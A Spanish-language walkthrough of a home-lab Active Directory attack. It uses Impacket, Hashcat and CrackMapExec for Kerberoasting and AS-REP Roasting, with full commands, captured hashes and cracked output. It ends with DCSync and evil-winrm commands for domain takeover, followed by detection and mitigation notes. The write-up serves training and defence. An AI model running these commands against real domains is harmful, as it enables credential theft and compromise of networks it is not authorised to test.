# Writeup — Kerberoasting + AS-REP Roasting en laboratorio AD

**Fecha:** 14/08/2026  
**Entorno:** Laboratorio propio — empresa.local  
**Herramientas:** Impacket, Hashcat, CrackMapExec  
**MITRE ATT&CK:** T1558.003 (Kerberoasting) · T1558.004 (AS-REP Roasting)

---

## Entorno del laboratorio

```
Kali Linux (atacante)     192.168.1.35
Windows Server 2022 (DC)  192.168.1.10  — empresa.local
Windows 11 (workstation)  192.168.1.41  — WKSTN01.empresa.local
```

Usuarios del dominio configurados para la práctica:

| Usuario | Tipo | Vulnerabilidad |
|---------|------|----------------|
| juan.garcia | Usuario estándar | Punto de entrada |
| svc-sql | Cuenta de servicio | SPN → Kerberoastable |
| maria.lopez | Usuario | Sin pre-auth → AS-REP Roastable |
| Administrador | Domain Admin | Objetivo final |

---

## Fase 1 — Reconocimiento

Con las credenciales de `juan.garcia` (usuario estándar sin privilegios),
verificamos el dominio y sus usuarios:

```bash
crackmapexec smb 192.168.1.10 -u juan.garcia -p "Password123!" -d empresa.local
```

Resultado:
```
SMB  192.168.1.10  445  DC01  [+] empresa.local\juan.garcia:Password123!
SMB  192.168.1.10  445  DC01  Windows Server 2022 Build 20348 (signing:True) (SMBv1:False)
```

Confirmado: credenciales válidas, dominio activo, SMBv1 deshabilitado.

---

## Fase 2 — Kerberoasting (T1558.003)

### ¿Por qué funciona?

Cualquier usuario autenticado puede solicitar un Ticket de Servicio (TGS)
para cualquier SPN registrado en el dominio. El TGS viene cifrado con el
hash NTLM de la cuenta de servicio. Si la contraseña es débil, se crackea offline.

### Enumeración de SPNs y captura del hash

```bash
impacket-GetUserSPNs empresa.local/juan.garcia:"Password123!" \
    -dc-ip 192.168.1.10 -request -outputfile /tmp/kerberoast.txt
```

Resultado:
```
ServicePrincipalName              Name     MemberOf  PasswordLastSet
--------------------------------  -------  --------  ----------------------------
MSSQLSvc/db01.empresa.local:1433  svc-sql            2026-08-14 12:36:51.470354

$krb5tgs$23$*svc-sql$EMPRESA.LOCAL$empresa.local/svc-sql*$ea832c3c...
```

Se identificó `svc-sql` con el SPN `MSSQLSvc/db01.empresa.local:1433`.
El hash capturado es de tipo **etype 23 (RC4)** — más rápido de crackear
que AES (etype 17/18).

### Crackeo offline con Hashcat

```bash
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

Resultado:
```
Status:    Cracked
Hash.Mode: 13100 (Kerberos 5, etype 23, TGS-REP)
Time:      2 mins 14 secs

$krb5tgs$23$*svc-sql$...:Password123!
```

**Credencial obtenida:** `svc-sql : Password123!`

### Verificación del acceso

```bash
crackmapexec smb 192.168.1.10 -u svc-sql -p "Password123!" -d empresa.local
```

```
SMB  192.168.1.10  445  DC01  [+] empresa.local\svc-sql:Password123!
```

Acceso confirmado con las credenciales crackeadas.

---

## Fase 3 — AS-REP Roasting (T1558.004)

### ¿Por qué funciona?

Kerberos normalmente requiere que el cliente demuestre que conoce
la contraseña **antes** de solicitar el ticket (pre-autenticación).
Si un usuario tiene deshabilitada la pre-autenticación (`DONT_REQ_PREAUTH`),
cualquiera puede solicitar su AS-REP — que viene cifrado con su hash NTLM.

**No se necesitan credenciales** si se conoce el nombre del usuario.

### Captura del hash AS-REP

```bash
impacket-GetNPUsers empresa.local/maria.lopez \
    -dc-ip 192.168.1.10 \
    -no-pass \
    -format hashcat \
    -outputfile /tmp/asrep.txt
```

Resultado:
```
$krb5asrep$23$maria.lopez@EMPRESA.LOCAL:6d4a271d70922c89e2c1e13fef545b0e...
```

### Crackeo offline

```bash
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

Resultado:
```
Status:    Cracked
Hash.Mode: 18200 (Kerberos 5, etype 23, AS-REP)
Time:      2 mins 3 secs

$krb5asrep$23$maria.lopez@EMPRESA.LOCAL:...:Password123!
```

**Credencial obtenida:** `maria.lopez : Password123!`

---

## Resumen del ataque

```
[juan.garcia] ──► Kerberoasting ──► hash svc-sql ──► crackeo ──► Password123!
                                                                       │
                                                              CME verifica acceso
                                                                       │
[sin creds]  ──► AS-REP Roast  ──► hash maria.lopez ──► crackeo ──► Password123!
```

| Ataque | Objetivo | Hash | Tiempo crackeo | Contraseña |
|--------|----------|------|----------------|------------|
| Kerberoasting | svc-sql | $krb5tgs$23$ | ~2 min | Password123! |
| AS-REP Roasting | maria.lopez | $krb5asrep$23$ | ~2 min | Password123! |

---

## Detección (Blue Team)

| Ataque | Event ID | Qué buscar |
|--------|----------|------------|
| Kerberoasting | 4769 | EncryptionType = 0x17 (RC4), múltiples en poco tiempo |
| AS-REP Roasting | 4768 | Pre-auth Type = 0 desde IP sospechosa |
| Ambos | 4771 | Fallos de Kerberos |

---

## Mitigación

**Para Kerberoasting:**
- Usar contraseñas largas (+25 chars) en cuentas de servicio
- Migrar a Group Managed Service Accounts (gMSA)
- Usar AES en vez de RC4: `Set-ADUser svc-sql -KerberosEncryptionType AES256`

**Para AS-REP Roasting:**
- No desactivar la pre-autenticación Kerberos salvo causa justificada
- Revisar periódicamente: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`

---

## Siguiente paso — Escalada a Domain Admin

Con las credenciales obtenidas, el siguiente vector es:

```bash
# Si svc-sql tiene privilegios de replicación → DCSync
impacket-secretsdump empresa.local/svc-sql:"Password123!"@192.168.1.10 -just-dc-ntlm

# Movimiento lateral con evil-winrm
evil-winrm -i 192.168.1.10 -u svc-sql -p "Password123!"
```

Ver módulo [06-Domain-Dominance/dcsync.md](../06-Domain-Dominance/dcsync.md)
